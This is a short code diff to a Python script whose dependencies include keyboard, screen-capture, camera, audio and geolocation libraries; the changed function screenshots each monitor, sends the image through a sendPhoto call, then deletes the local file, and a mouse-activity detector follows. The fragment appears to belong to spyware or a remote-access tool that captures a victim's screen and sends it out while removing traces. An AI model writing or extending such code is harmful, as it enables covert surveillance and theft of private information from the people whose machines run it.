@@ -5,13 +5,15 @@ pip install requests geocoder mss keyboard pathlib opencv-python pyaudio wave au
 """
 
 def takeScreenshots():
+    
+    ts = datetime.datetime.now().strftime("%Y_%m_%d_%H_%M_%S")
 	
 	with mss.mss() as sct: 
 		
 		for i in range(1, 3):
-			sct.shot(mon=i, output=f"{datadir}\\screen.png")
-			sendPhoto(f"{datadir}\\screen.png")
-			os.remove(f"{datadir}\\screen.png")
+			sct.shot(mon=i, output=f"{datadir}\\screen_{i}_{ts}.png")
+			sendPhoto(f"{datadir}\\screen_{i}_{ts}.png")
+			os.remove(f"{datadir}\\screen_{i}_{ts}.png")
 
 def detectMouseActivity():
 	
